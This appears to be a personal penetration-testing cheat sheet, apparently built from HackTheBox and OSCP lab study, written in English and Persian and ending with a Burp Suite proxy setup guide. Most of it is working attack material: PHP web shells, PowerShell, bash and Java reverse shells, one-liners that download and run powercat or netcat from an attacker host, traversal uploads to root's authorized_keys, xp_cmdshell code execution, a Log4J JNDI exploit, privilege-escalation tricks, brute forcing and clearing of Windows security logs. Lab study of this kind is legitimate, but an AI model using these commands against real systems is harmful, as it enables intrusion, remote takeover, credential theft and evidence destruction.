+------------ RFI:
+
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+
+python3 -m http.server 80
+
+curl "http://<DNS>/index.php?page=http://x.x.x.x/simple-backdoor.php&cmd=ls"
+
+PHP file extensions => .php => .phP or .phps or .php7-> curl http...
+
+powershell reverse shell:
+
+$client = New-Object System.Net.Sockets.TCPClient('XX.XX.XX.XX',XX);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+pwsh
+
+$Text = 'powershell reverse shell'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+
+powershell -enc ...   =>
+$ curl http://x.x.x.x/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20...
+
+nc -nvlp xxxx -> ipconfig
+
+/usr/share/webshells/
+
+------------ Non excutable fiel:
+
+target : /root/.ssh/authorized_keys
+
+SSH keypair : ssh-keygen
+ک جفت کلید می‌سازد:
+fileup → private key
+fileup.pub → public key
+
+این همان سازوکار معمول SSH است.
+
+cat fileup.pub > authorized_keys
+
+upload with Burp suite : filename=../../../../../../../root/.ssh/authorized_keys
+
+ssh -p 2222 -i fileup root@mountaindesserts.com
+
+------------ Command injection:
+curl -X POST --data 'Parameter=command' http://x.x.x.x:x/folder -> curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+
+"CMD" or "PowerShell":
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+
+powercat:
+
+cp ../powercat.ps1 . => python3 -m http.server 80 => nc -nvlp 4444 
+
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c X.X.X.X -p XXXX -e powershell
+
+%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20X.X.X.X%20-p%20XXXX%20-e%20powershell
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+#################################################################################################################
+
+
+
+
+23 telnet <ip>
+
+21 ftp <ip>
+
+
+
+6379 redis-cli -h <ip>
+info
+select <db-index>
+keys <*>
+get <key-name>
+
+3389 xfreerdp /u:Administrator /v:<ip> /cert:ignore
+
+80 http: gobuster dir -u http://<ip> -w <wordlist> -x (php,txt)
+dir: https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/common.txt
+gobuster vhost -u http://<dns> -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+subdomain: https://github.com/danielmiessler/SecLists.git
+
+
+mongodb: ./mongosh mongodb://<ip>:<port>
+show dbs
+use sensitive_information
+show collections
+db.flag.find()
+
+rsync --list-only <ip>::public
+                  <ip>::public/<finle-name>
+
+##################Tier 2#####################
+
+
+sql: admin' #
+     admin' --
+Username: admin / Password: admin
+Username: guest / Password: guest
+Username: user / Password: user
+Username: root / Password: root
+Username: administrator / Password: password
+
+mysql -h <ip> -u root (--skip-ssl / --ssl-mode=DISABLED)
+SHOW databases;
+USE <db-name>;
+SHOW <table>;
+SELECT * FROM <table-name>;
+
+(sudo pkill dhclient
+sudo nmcli device status
+sudo nmcli device connect <interface>)
+
+ftp <ip>
+dir
+get <file-name>
+(login.php)
+
+LFI , RFI:
+(5985 http , 5986 https)
+echo "<ip> <dns>" | sudo tee -a /etc/hosts
+http://<dns>/index.php?page=(../../../)windows/system32/drivers/etc/hosts
+https://github.com/lgandx/Responder.git
+python3 Responder.py -I <interface>
+http://<dns>/index.php?page=//<ip>/somefile
+evil-winrm -i <ip> -u <user> -p <pass>
+
+s3:
+aws configure
+bucket list:
+aws --endpoint=http://s3.<dns> s3 ls
+bucket files:
+aws aws --endpoint=http://s3.<>dns s3 ls s3://<dns>
+<?php system($_GET["cmd"]); ?>
+<?php echo system($_REQUEST['cmd']);?>
+http://10.129.49.127/_uploaded/phpshell.php<?cmd=whoami>
+upload on s3:
+aws --endpoint=http://s3.<dns> s3 cp shell.php s3://<dns>    
+http://<dns>/shell.php?cmd=id
+reverse shell:
+ifconfig
+#!/bin/bash
+bash -i >& /dev/tcp/<ifconfIp>/<port> 0>&1
+python3 -m http.server <8000>
+nc -nvlp <port>
+http://<dns>/shell.php?cmd=curl%20<ifconfIp>:<8000>/shell.sh|bash
+
+Reflection:
+whatweb -v http://<dns/ip>
+wappalyzer
+{{7*7}} → Jinja2  
+${7*7} → FreeMarker, Velocity  
+<%= 7*7 %> → ERB, JSP  
+#{7*7} → Pebble  
+{{ "test" | upper }} → Jinja2
+payloads
+hacktricks
+https://github.com/swisskyrepo/PayloadsAllTheThings
+file:grep -RIl --exclude-dir=.git -i "<search>" .
+payload:grep -RIn --color -C <lines> --exclude-dir=.git -i "<serach>" .
+
+FTP:
+sftp -P <> <>@<>
+ftp <ip>
+dir , cd , get
+hydra -t <2 / 4> -L <username.txt> -P <"pass"/pas.txt> -s <port> <ip> <ssh/ftp/...>
+ss -tlpn
+postgreSQL:5432
+ssh -L <port-local>:localhost:<port-des> <>@<> -f -N
+psql -U <user> -h localhost -p <port>
+\l , \c , \dt , SELECT * FROM <table>
+
+Jenkins:
+root , password
+http:<>/svript
+ip a | grep tun0
+kacktricks OR nc
+nc -nlvpp <port>
+String host="<ip>";
+int port=<nc-port>;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()) {
+    while(pi.available()>0) so.write(pi.read());
+    while(pe.available()>0) so.write(pe.read());
+    while(si.available()>0) po.write(si.read());
+    so.flush();
+    po.flush();
+    Thread.sleep(50);
+    try {p.exitValue();break;} catch (Exception e){}
+};
+p.destroy();
+s.close();
+
+135:RPC
+139:NetBios
+445:SMB
+
+https://github.com/SecureAuthCorp/impacket.git
+(find . -type f -name "<file-name>"
+grep -Ri "<word>" .)
+python3 psexec.py administrator@<ip>
+
+SQL:
+https://github.com/SecureAuthCorp/impacket.git
+python3 impacket/examples/mssqlclient.py ARCHETYPE/<users>@<ip> -windows-auth
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
+sudo python3 -m http.server <80>
+sudo nc -lnvp <443>
+ip : ip a | grep tun0
+ٍEXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<ip>/nc64.exe -outfile nc64.exe"
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <ip> 443"
+powershell -c "Remove-Item .\nc64.exe -Force"
+
+
+# MSSQL (Archetype)
+Connect: python3 mssqlclient.py DOMAIN/user@{TARGET_IP} -windows-auth
+Check sysadmin: SELECT is_srvrolemember('sysadmin');
+Enable xp_cmdshell: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+RCE: EXEC xp_cmdshell 'whoami';
+
+# MySQL (Sequel)
+Connect: mysql -h {TARGET_IP} -u root --skip-ssl
+List DBs: SHOW databases;
+Select DB: USE {DB_NAME};
+List tables: SHOW tables;
+Dump table: SELECT * FROM {TABLE_NAME};
+
+# PostgreSQL (Funnel)
+Connect: psql -U {USER} -h localhost -p {PORT}
+List DBs: \l
+Select DB: \c {DB_NAME}
+List tables: \dt
+Dump table: SELECT * FROM {TABLE_NAME};
+SELECT pg_read_file('/etc/passwd');
+SELECT pg_ls_dir('/home/wilson');
+/etc/shadow
+/var/www/html/.htaccess
+
+# MongoDB (Mongod)
+Connect: ./mongosh mongodb://{TARGET_IP}:27017
+List DBs: show dbs
+Select DB: use {DB_NAME}
+List collections: show collections
+Dump data: db.{COLLECTION_NAME}.find()
+
+netstat -tulnp | grep :80
+systemctl stop <p-name>
+killall <p-name>
+
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
+cd C:\<path> powershell -c wget http://<ip>/winPEASx64.exe -outfile winPEASx64.exe
+.\winPEASx64.exe
+.\<.exe> > <.txt>
+nc -lvnp 4444 > <.txt>
+.\nc64.exe <ip> 4444 < <.txt>
+curl http://10.10.14.6/nc64.exe
+cat <.txt> | grep -i "ConsoleHost_history"
+cat <.txt> | grep -i "SeImpersonatePrivilege"
+
+Privilege Escalation:
+cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+type ConsoleHost_history.txt
+python3 impacket/examples/psexec.py administrator@<ip>
+
+REVERSE SHELL:
+https://github.com/BlackArch/webshells
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import os; os.execv("/bin/bash", ["/bin/bash", "-i"])'
+php files:
+/var/www/html/cdn-cgi/login (cat * | grep -i passw*)
+cat /etc/passwd
+id
+find / -group <group-name> 2>/dev/null
+SUID:
+ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+export PATH=/tmp:$PATH
+
+JOHN THE RIPPER:
+sudo apt update
+sudo apt install -y git build-essential libssl-dev zlib1g-dev libbz2-dev libgmp-dev libpcap-dev yasm pkg-config liblzma-dev
+cd /opt
+sudo git clone https://github.com/openwall/john.git
+sudo chown -R $(whoami):$(whoami) john
+cd john/src
+./configure
+make -sj$(nproc)
+cd /opt/john/run
+ls -l john zip2john
+./john --list=formats | grep -i pkzip
+# پاک کردن لینک‌های قدیمی
+sudo rm -f /usr/local/bin/john /usr/local/bin/zip2john
+# wrapper برای john
+sudo tee /usr/local/bin/john > /dev/null <<'SH'
+#!/bin/sh
+export JOHN_HOME=/opt/john/run
+exec /opt/john/run/john "$@"
+SH
+sudo chmod +x /usr/local/bin/john
+# wrapper برای zip2john
+sudo tee /usr/local/bin/zip2john > /dev/null <<'SH'
+#!/bin/sh
+export JOHN_HOME=/opt/john/run
+exec /opt/john/run/zip2john "$@"
+SH
+sudo chmod +x /usr/local/bin/zip2john
+
+zip2john <file> > <new-file>
+snap run john-the-ripper.zip2john <file> > <n-file>
+john --worlist=./rockyou.txt <n-file>
+
+sudo apt-get update --fix-missing
+sudo apt-get install -f
+
+hashid <hash>
+hashcat -a 0 -m 0 <hash-file> <w-list>
+hashcat -m 0 <hash-file> --show
+
+SQLMAP:
+sqlmap -u '<http://10.129.95.174/dashboard.php?search=any+query>' --
+cookie="<name>=<value>" --os-shell
+
+BETTER SHELL:
+bash -c "bash -i >& /dev/tcp/<ip>/<443> 0>&1"
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+#BULLSHIT:
+#CTRL+Z
+#stty raw -echo
+#fg
+#export TERM=xterm
+https://gtfobins.github.io/gtfobins/vi/#sudo
+sudo -l
+
+Log4J:
+sudo tcpdump -i <interface> port <port> -n
+"${jndi:ldap://<if-ip>:<1389>/test}"
+
+sudo apt install openjdk-11-jdk
+sudo apt-get install maven
+https://github.com/veracode-research/rogue-jndi
+mvn package
+echo 'bash -c bash -i >&/dev/tcp/<my-ip>/<port+1024> 0>&1' | base64
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64-string>}|{base64,-d}|{bash,-i}" --hostname "<interface-ip>"
+nc -lvp <port+1024>
+${jndi:ldap://{Your Tun0 IP}:<1389>/o=tomcat}
+script /dev/null -c bash
+(stty raw -echo; fg)ctrl+z
+
+grep -E '<patern>|^' file.txt
+ps auxww
+mongo --port <port> ace --eval "db.admin.find().forEach(printjson);"
+
+$1$ → MD5 →		     mkpasswd -m md5 pwn123
+$2a$ → Blowfish →	     mkpasswd -m blowfish pwn123
+$2y$ → Blowfish →	     mkpasswd -m blowfish pwn123
+$5$ → SHA-256 →		     mkpasswd -m sha-256 pwn123
+$6$ → SHA-512 →		     mkpasswd -m sha-512 pwn123
+$y$ → yescrypt →	     mkpasswd -m yescrypt pwn123
+$gy$ → gost-yescrypt →	     mkpasswd -m gost-yescrypt pwn123
+$7$ → scrypt →		     mkpasswd -m scrypt pwn123
+
+sudo apt install whois
+mkpasswd -m <hash-type> <pass>
+mongo --port <port> ace --eval 'db.admin.update({"_id":ObjectId("<id>")},{$set:{"x_shadow":"<hash>"}})'
+mongo --port <port> ace --eval 'db.admin.update({"name":"Administrator"}, {$set:{"x_shadow":"<hash>"}})'
+
+
+########### MongoDB ###########
+# لیست دیتابیس‌ها
+mongo --port 27017 --eval "show dbs"
+
+# لیست جدول‌ها
+mongo --port 27017 dbname --eval "show collections"
+
+# دیدن کاربرها
+mongo --port 27017 dbname --eval "db.users.find()"
+
+########### MySQL ###########
+# ورود بدون پسورد (اگه اجازه بده)
+mysql -u root -h 127.0.0.1
+
+# لیست دیتابیس‌ها
+SHOW DATABASES;
+
+# لیست جدول‌ها
+USE dbname; SHOW TABLES;
+
+# دیدن کاربرها
+SELECT user,authentication_string FROM mysql.user;
+
+
+########### PostgreSQL ###########
+# ورود
+psql -U postgres -h 127.0.0.1
+
+# لیست دیتابیس‌ها
+\l
+
+# لیست جدول‌ها
+\c dbname; \dt
+
+# دیدن کاربرها
+\du
+
+########### Redis ###########
+redis-cli
+> KEYS *
+> GET admin_password
+
+########### SQLite ###########
+sqlite3 app.db
+> .tables
+> SELECT * FROM users;
+
+#### PASSWORD CHANGING ####
+دیتابیس,دستور تغییر پسورد
+#MongoDB
+db.users.update({""name"":""admin""}, {$set:{""password"":""$6$...""}})
+#MySQL
+ALTER USER 'root'@'localhost' IDENTIFIED BY 'pwn123';
+#PostgreSQL
+ALTER USER postgres PASSWORD 'pwn123';
+#Redis
+CONFIG SET requirepass ""pwn123""
+#SQLite
+UPDATE users SET password='pwn123' WHERE username='admin';
+
+#### ACCESS ####
+# Port
+ss -tulnp
+
+# Process
+ps aux
+
+#### Authirization ####
+default pass: root, admin, password
+file check: config.php, settings.py, application.yml
+log check: grep -r ""password"" /var/log/
+
+
+Local File Inclusion vulnerability:
+http://<ip>/ ?file= / index.php?file=
+curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "http://<ip>/?file=home.php"
+gobuster dir -u "url" -w <common.txt> -q -x <php,txt,conf,backup,bak> <--add-slash> -t 50 -k -s "200,301,302" -b "404,403" --exclude-length 0
+curl 'founded-url'
+sudo nmap -sU -p 53,67,68,69,123,161,162,137,138,111 <ip>
+
+tftp <ip>
+put
+curl "url-execute-shell/var/lib/tftpboot"
+
+/var/www/html
+ls -al
+
+PE:
+id 
+groups
+LXD:
+https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html#lxdlxc-group---privilege-escalation
+https://images.lxd.canonical.com/
+Alpine 3.18
+lxd.tar.xz
+rootfs.squashfs
+
+XML:
+curl -i -X POST '<target>' -H 'Content-Type:<>' -H 'Cookie: PHPSESSID=<>' --data 'username=<>&password=<>'
+hydra -L <user-wl> -P <pass-wl> <TARGET> http-post-form "/<>:username=^USER^&password=^PASS^:F=<>" -V -t 4
+https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
+///c:/windows/win.ini
+///c:/users/<user>/.ssh/id_rsa
+chmod 400 id_rsa
+ssh -i id_rsa <user>@<ip>
+whoami /priv
+cd C:\
+icacls <file>
+    F - Full control (دسترسی کامل)
+
+    M - Modify (تغییر)
+
+    RX - Read & Execute (خواندن و اجرا)
+
+    R - Read (فقط خواندن)
+
+    W - Write (فقط نوشتن)
+
+    D - Delete (حذف)
+# لیست تمام لاگ‌های رویداد
+wevtutil el
+
+# خروجی گرفتن از یک لاگ خاص
+wevtutil epl Security backup.evtx
+
+# پاک کردن یک لاگ
+wevtutil cl Security
+
+# نمایش اطلاعات درباره یک لاگ
+wevtutil gl Security
+powershell
+ps
+| findstr /I /N /S "*<>"
+| Select-String -Pattern "<>"
+https://github.com/rahuldottech/netcat-for-windows/releases
+https://github.com/int0x33/nc.exe
+wget http://<ip>:<port>/nc64.exe -outfile nc64.exe
+echo C:\...\nc64.exe -e cmd.exe <my-ip> <port> > C:\...\<schtasks-file>
+schtasks /query /fo LIST
+
+PHP strcmp:
+strcmp($username, $_POST['username']) == 0
+tac
+<?php phpinfo(); ?>
+burp repeater → get → post → ctrl+u
+/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+www-data
+sudo -l
+
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+/usr/bin/find . -exec /bin/sh -p \; -quit
+
+
+config.php-2-$username = "admin";
+config.php:3:$password = "thisisagoodpassword";
+f54846c258f3b4612f78a819573d158e
+
+
+########################################################################
+################################### OSCP ###############################
+########################################################################
+
+whois <domain/ip> -h <whois-server>
+
+### GHDB ###
+site:<domain> filetype:<txt>
+              -filetype:<html>
+intitle:"index of" "parent directory" 
+#in title : index of / in page : parent directory
+site:linkedin.com/in "<company>" -intitle:"profiles"
+
+https://searchdns.netcraft.com/
+
+tar -xzf
+unzip
+./gitrob analyze megacorpone --github-access-token $GITHUB_TOKEN
+
+nc -nv -u -z -w 1 <ip> 120-123
+
+sudo iptables -I INPUT 1 -s <ip> -j ACCEPT
+sudo iptables -I OUTPUT 1 -d <ip> -j ACCEPT
+sudo iptables -Z
+sudo iptables -L INPUT --line-numbers
+sudo iptables -vn -L
+sudo iptables -D INPUT <1>
+
+
+
+
+
+
+
+
+
+اتصال Burp Suite به مرورگر با FoxyProxy (مرحله‌به‌مرحله)
+۱. تنظیم Burp Suite
+
+Burp را اجرا کن.
+
+از نوار بالا برو به:
+Proxy → Proxy Settings
+
+در بخش Proxy Listeners باید یک Listener فعال ببینی:
+
+Interface: 127.0.0.1
+
+Port: 8080
+
+اگر نیست، این کار را کن:
+
+روی Add کلیک کن
+
+Bind to address: 127.0.0.1
+
+Port: 8080
+
+گزینه Running را فعال کن
+
+OK
+
+(8080 پورت پیش‌فرض Burp است. لازم نیست تغییرش بدهی.)
+
+۲. تنظیم FoxyProxy در مرورگر (Firefox یا Chrome)
+۱. نصب افزونه
+
+Firefox: افزونه FoxyProxy Standard
+
+Chrome: افزونه FoxyProxy
+
+بعد از نصب، آیکن روباه آبی/نارنجی بالای مرورگر ظاهر می‌شود.
+
+۳. ساخت پروفایل برای Burp در FoxyProxy
+
+روی آیکن FoxyProxy کلیک کن.
+
+گزینه Options یا Settings را بزن.
+
+روی Add New Proxy کلیک کن.
+
+این مقدارها را وارد کن:
+
+General
+
+Proxy Name: Burp
+
+Proxy Type: HTTP
+
+Proxy Details
+
+IP Address / Host: 127.0.0.1
+
+Port: 8080
+
+چیز دیگری لازم نیست.
+
+پایین صفحه، Save را بزن.
+
+۴. فعال کردن پروکسی
+
+دوباره روی آیکن FoxyProxy کلیک کن.
+
+پروکسی‌ای که ساختی (Burp) را انتخاب کن.
+
+اگر گزینه‌ها را مثل زیر ببینی صحیح است:
+
+Use Burp for all URLs
+
+اکنون همه ترافیک مرورگر → به Burp → سپس به اینترنت می‌رود.
+
+۵. نصب گواهی Burp (برای HTTPS) – مهم
+
+اگر این را انجام ندهی سایت‌های HTTPS خطا می‌دهند.
+
+در مرورگر باز کن:
+
+http://burp
+
+
+روی لینک:
+CA Certificate
+کلیک کن و فایل cacert.der را دانلود کن.
+
+Firefox
+
+برو به:
+
+about:preferences
+
+
+پایین اسکرول کن → Privacy & Security
+
+قسمت Certificates
+
+دکمه View Certificates
+
+Import
+
+فایل cacert.der
+
+دو گزینه زیر را تیک بزن:
+
+Trust this CA to identify websites
+
+Trust this CA to identify email users (اختیاری)
